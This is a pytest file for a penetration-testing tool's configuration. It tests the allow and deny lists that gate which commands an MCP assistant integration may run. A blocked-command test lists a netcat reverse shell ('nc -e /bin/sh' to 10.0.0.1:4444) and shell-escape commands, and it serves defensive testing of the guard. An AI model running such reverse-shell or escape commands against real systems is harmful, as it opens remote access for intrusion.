"""Tests for CernoConfig fields, focused on the MCP exec allow/deny lists."""

import dataclasses

import pytest

import cerno_pkg.config as config_mod
from cerno_pkg.config import (
    DEFAULT_MCP_EXEC_ALLOWLIST,
    DEFAULT_MCP_EXEC_DENYLIST,
    CernoConfig,
    build_config_rows,
    coerce_str_list,
    config_field_kind,
    iter_config_fields,
    load_config,
    save_config,
)
from cerno_pkg.exec_chain import is_runnable

_DEFAULT_ALLOWLIST = list(DEFAULT_MCP_EXEC_ALLOWLIST)
_DEFAULT_DENYLIST = list(DEFAULT_MCP_EXEC_DENYLIST)


@pytest.fixture
def config_path(tmp_path, monkeypatch):
    """Point the config loader/saver at a throwaway file."""
    path = tmp_path / "config.yaml"
    monkeypatch.setattr(config_mod, "get_config_path", lambda: path)
    return path


@pytest.mark.unit
def test_mcp_exec_allowlist_default():
    assert CernoConfig().mcp_exec_allowlist == _DEFAULT_ALLOWLIST


@pytest.mark.unit
def test_mcp_exec_allowlist_default_is_not_shared():
    """default_factory must give each instance its own list (no shared mutable)."""
    a = CernoConfig()
    b = CernoConfig()
    a.mcp_exec_allowlist.append("sqlmap")
    assert "sqlmap" not in b.mcp_exec_allowlist


@pytest.mark.integration
def test_mcp_exec_allowlist_save_load_roundtrip(config_path):
    assert save_config(CernoConfig(mcp_exec_allowlist=["nmap", "ffuf"]))
    assert load_config().mcp_exec_allowlist == ["nmap", "ffuf"]


@pytest.mark.integration
def test_mcp_exec_allowlist_missing_uses_default(config_path):
    # A config file without the key loads the built-in default.
    config_path.write_text("debug_logging: true\n", encoding="utf-8")
    assert load_config().mcp_exec_allowlist == _DEFAULT_ALLOWLIST


@pytest.mark.unit
def test_claude_assistant_disabled_by_default():
    assert CernoConfig().claude_assistant_enabled is False


@pytest.mark.integration
def test_claude_assistant_default_persists_false(config_path):
    # A config file without the key loads the opt-in default (off).
    config_path.write_text("debug_logging: true\n", encoding="utf-8")
    assert load_config().claude_assistant_enabled is False


@pytest.mark.unit
def test_default_allowlist_drops_proxychains():
    # proxychains4 is unwrapped (and covered by use_proxy), so it needs no entry.
    assert "proxychains4" not in _DEFAULT_ALLOWLIST


@pytest.mark.unit
@pytest.mark.parametrize(
    "command",
    [
        ["curl", "-sk", "https://10.0.0.1"],
        ["wget", "-nc", "-r", "-i", "browsable.urls"],
        ["dig", "example.com"],
        ["host", "example.com"],
        ["nslookup", "example.com"],
        ["whois", "example.com"],
        ["ping", "-c", "1", "10.0.0.1"],
        ["traceroute", "10.0.0.1"],
        ["ssh-audit", "10.0.0.1"],
        ["sslscan", "10.0.0.1:443"],
        ["testssl.sh", "10.0.0.1:443"],
        ["testssl", "10.0.0.1:443"],
        ["whatweb", "http://10.0.0.1"],
        ["showmount", "-e", "10.0.0.1"],
        ["rpcinfo", "-p", "10.0.0.1"],
        ["snmpwalk", "-v2c", "-c", "public", "10.0.0.1"],
        ["onesixtyone", "10.0.0.1"],
        ["sudo", "curl", "https://10.0.0.1"],
    ],
)
def test_default_allowlist_permits_recon_utilities(command):
    ok, reason = is_runnable(command, _DEFAULT_ALLOWLIST, _DEFAULT_DENYLIST)
    assert ok, reason


@pytest.mark.unit
@pytest.mark.parametrize(
    "command",
    [
        ["bash", "-c", "id"],
        ["python3", "-c", "print(1)"],
        ["find", ".", "-exec", "id", ";"],
        ["ssh", "user@10.0.0.1"],
        ["nc", "-e", "/bin/sh", "10.0.0.1", "4444"],
        ["smbclient", "-L", "//10.0.0.1"],
        ["responder", "-I", "eth0"],
    ],
)
def test_default_allowlist_excludes_shell_escapes_and_attack_tools(command):
    ok, _ = is_runnable(command, _DEFAULT_ALLOWLIST, _DEFAULT_DENYLIST)
    assert not ok


@pytest.mark.unit
def test_mcp_exec_denylist_default():
    cfg = CernoConfig()
    assert cfg.mcp_exec_denylist == _DEFAULT_DENYLIST
    assert "rm" in cfg.mcp_exec_denylist


@pytest.mark.unit
def test_mcp_exec_denylist_default_is_not_shared():
    a = CernoConfig()
    b = CernoConfig()
    a.mcp_exec_denylist.append("curl")
    assert "curl" not in b.mcp_exec_denylist


@pytest.mark.integration
def test_mcp_exec_denylist_save_load_roundtrip(config_path):
    assert save_config(CernoConfig(mcp_exec_denylist=["rm", "sh"]))
    assert load_config().mcp_exec_denylist == ["rm", "sh"]


@pytest.mark.integration
def test_mcp_exec_denylist_missing_uses_default(config_path):
    config_path.write_text("debug_logging: true\n", encoding="utf-8")
    assert load_config().mcp_exec_denylist == _DEFAULT_DENYLIST


@pytest.mark.integration
def test_empty_allowlist_persists_as_empty(config_path):
    # Empty means deny-all now, so it must not be replaced by the default on load.
    assert save_config(CernoConfig(mcp_exec_allowlist=[]))
    assert load_config().mcp_exec_allowlist == []


@pytest.mark.integration
def test_scalar_yaml_allowlist_is_coerced_to_list(config_path):
    # A hand-edited scalar must become a list, not stay a str (substring matching).
    config_path.write_text(
        "mcp_exec_allowlist: nmap,nxc\nmcp_exec_denylist: '*'\n", encoding="utf-8"
    )
    cfg = load_config()
    assert cfg.mcp_exec_allowlist == ["nmap", "nxc"]
    assert cfg.mcp_exec_denylist == ["*"]


@pytest.mark.unit
@pytest.mark.parametrize(
    "value, expected",
    [
        (" nmap , nxc ,, msfconsole ", ["nmap", "nxc", "msfconsole"]),
        ("*", ["*"]),
        ("", []),
        ([" nmap ", "", "nxc"], ["nmap", "nxc"]),
        (("a", "b"), ["a", "b"]),
        (None, ["dflt"]),
        (42, ["dflt"]),
    ],
)
def test_coerce_str_list(value, expected):
    assert coerce_str_list(value, ("dflt",)) == expected


# ---------------------------------------------------------------------------
# Single-source-of-truth guards: a new CernoConfig field must carry the
# metadata that makes it load/save/show/set-able, or these fail.
# ---------------------------------------------------------------------------

_VALID_KINDS = {"str", "path", "int", "bool", "list"}


@pytest.mark.unit
def test_every_field_has_required_metadata():
    missing = []
    for f in iter_config_fields():
        meta = f.metadata
        if not ({"section", "help", "kind"} <= set(meta)):
            missing.append(f.name)
        elif meta["kind"] not in _VALID_KINDS:
            missing.append(f"{f.name} (bad kind {meta.get('kind')!r})")
    assert not missing, f"fields missing/invalid metadata: {missing}"


@pytest.mark.unit
def test_config_show_renders_every_field():
    rendered = {key for _section, key, _v, _d, _h in build_config_rows(CernoConfig())}
    all_fields = {f.name for f in iter_config_fields()}
    assert rendered == all_fields


@pytest.mark.unit
def test_config_set_kind_defined_for_every_field():
    # config set coercion dispatches on kind; every field must resolve one.
    for f in iter_config_fields():
        assert config_field_kind(f.name) in _VALID_KINDS


@pytest.mark.integration
def test_every_field_round_trips_through_save_load(config_path):
    """Set every field to a non-default sentinel, save, reload, assert preserved."""
    cfg = CernoConfig()
    sentinels: dict[str, object] = {}
    for f in iter_config_fields():
        kind = f.metadata["kind"]
        if kind == "bool":
            value: object = not getattr(cfg, f.name)
        elif kind == "int":
            value = 4242
        elif kind == "list":
            value = ["sentinel-a", "sentinel-b"]
        elif f.metadata.get("choices"):
            # Pick a valid choice that differs from the default.
            value = next(c for c in f.metadata["choices"] if c != getattr(cfg, f.name))
        else:  # str / path
            value = f"sentinel-{f.name}"
        setattr(cfg, f.name, value)
        sentinels[f.name] = value

    assert save_config(cfg)
    loaded = load_config()
    for name, value in sentinels.items():
        assert getattr(loaded, name) == value, f"{name} did not round-trip"


@pytest.mark.integration
def test_mcp_allow_cred_injection_round_trip(config_path):
    assert save_config(CernoConfig(mcp_allow_cred_injection=True))
    assert load_config().mcp_allow_cred_injection is True
    # Absent from YAML -> default False
    config_path.write_text("mcp_allow_execution: true\n", encoding="utf-8")
    assert load_config().mcp_allow_cred_injection is False


@pytest.mark.unit
def test_proxy_settings_labelled_proxychains4():
    # Cerno only runs proxychains4; `config show` must say so. Key names stay
    # proxychains_* for compatibility with existing config.yaml files.
    proxy_fields = [
        f for f in dataclasses.fields(CernoConfig) if f.name.startswith("proxychains_")
    ]
    assert {f.name for f in proxy_fields} == {
        "proxychains_enabled",
        "proxychains_host",
        "proxychains_port",
    }
    for f in proxy_fields:
        assert f.metadata["section"] == "Proxychains4"
        assert "proxychains4" in f.metadata["help"]


# --- per-key reset (`cerno config reset <key>`) ---


@pytest.mark.unit
def test_reset_config_key_restores_scalar_nullable_and_list():
    from cerno_pkg.config import reset_config_key

    cfg = CernoConfig(
        debug_logging=True,
        custom_workflows_path="/tmp/custom.yaml",
        mcp_exec_allowlist=["nmap"],
    )
    assert reset_config_key(cfg, "debug_logging") is False
    assert cfg.debug_logging is False
    assert reset_config_key(cfg, "custom_workflows_path") is None
    assert cfg.custom_workflows_path is None
    assert reset_config_key(cfg, "mcp_exec_allowlist") == _DEFAULT_ALLOWLIST
    assert cfg.mcp_exec_allowlist == _DEFAULT_ALLOWLIST


@pytest.mark.unit
def test_reset_config_key_leaves_other_keys_alone():
    from cerno_pkg.config import reset_config_key

    cfg = CernoConfig(debug_logging=True, no_color=True)
    reset_config_key(cfg, "debug_logging")
    assert cfg.no_color is True


@pytest.mark.unit
def test_reset_config_key_unknown_key_raises():
    from cerno_pkg.config import reset_config_key

    with pytest.raises(KeyError):
        reset_config_key(CernoConfig(), "not_a_real_key")


@pytest.mark.integration
def test_cli_config_reset_single_key(config_path):
    from typer.testing import CliRunner

    from cerno import app

    runner = CliRunner()
    assert runner.invoke(app, ["config", "set", "debug_logging", "true"]).exit_code == 0
    assert runner.invoke(app, ["config", "set", "no_color", "true"]).exit_code == 0

    result = runner.invoke(app, ["config", "reset", "debug_logging"])
    assert result.exit_code == 0, result.output
    loaded = load_config()
    assert loaded.debug_logging is False
    assert loaded.no_color is True  # untouched
    # Single-key reset does not write a whole-file backup.
    assert not config_path.with_suffix(".yaml.backup").exists()


@pytest.mark.integration
def test_cli_config_reset_unknown_key_exits_1(config_path):
    from typer.testing import CliRunner

    from cerno import app

    result = CliRunner().invoke(app, ["config", "reset", "not_a_real_key"])
    assert result.exit_code == 1


# --- color_scheme ---


@pytest.mark.unit
def test_color_scheme_defaults_to_light():
    assert CernoConfig().color_scheme == "light"


@pytest.mark.integration
def test_cli_config_set_color_scheme_validates_choices(config_path):
    from typer.testing import CliRunner

    from cerno import app

    runner = CliRunner()
    assert runner.invoke(app, ["config", "set", "color_scheme", "blue"]).exit_code == 1
    assert load_config().color_scheme == "light"
    result = runner.invoke(app, ["config", "set", "color_scheme", "dark"])
    assert result.exit_code == 0, result.output
    assert load_config().color_scheme == "dark"


# --- cerno reset ---


@pytest.mark.integration
def test_reset_installation_removes_every_cerno_file(tmp_path, monkeypatch):
    """`cerno reset` leaves no stray files, so ~/.cerno itself is removed."""
    from pathlib import Path

    import cerno

    home = tmp_path / "home"
    cerno_dir = home / ".cerno"
    (cerno_dir / "artifacts").mkdir(parents=True)
    (cerno_dir / "scans").mkdir()
    for name in (
        "cerno.db",
        "cerno.db-wal",
        "cerno.db-shm",
        "config.yaml",
        "config.yaml.backup",
        "cerno.log",
        "cerno.log.1",
        "proxychains4.conf",
    ):
        (cerno_dir / name).write_text("x")

    monkeypatch.setattr(Path, "home", classmethod(lambda cls: home))
    monkeypatch.setattr(cerno.Prompt, "ask", lambda *a, **k: "reset")

    cerno.reset_installation()

    assert not cerno_dir.exists()
